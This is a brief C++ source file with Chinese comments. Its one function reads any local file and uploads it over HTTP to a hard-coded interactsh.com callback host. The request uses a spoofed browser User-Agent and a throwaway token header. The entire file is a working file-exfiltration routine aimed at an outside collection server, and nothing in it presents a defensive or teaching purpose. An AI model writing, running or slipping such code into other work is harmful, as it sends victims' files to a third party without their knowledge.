#include <iostream>
#include<httplib.h>
using namespace std;
void Post(string file_path)
{

    httplib::Client cli("c5x6g182vtc0000dds30gddo53ayyyyym.interactsh.com", 80);//获取网站
    //读取文件转换成流
    //ifstream file_stream("C:\\Users\\ascotbe\\Desktop\\1.png", ios::binary);
    ifstream file_stream(file_path, ios::binary);
    ostringstream string_stream;
    string_stream << file_stream.rdbuf();
    string content = string_stream.str();
    file_stream.close();
    httplib::MultipartFormDataItems items = { { "file", content,"1.png", "application/octet-stream" } };//psot数据包构造
    httplib::Headers headers = {
        { "Accept-Encoding", "gzip, deflate" },
        {"User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"},
        {"Content-Type","multipart/form-data;" },
        { "token", "fuck" }
    };//自定义请求头
    auto res = cli.Post("/person", headers, items);//发送请求

    if (res->status == 200) //请求返回状态码
    {
        cout << res->body << std::endl;//返回值
    }
}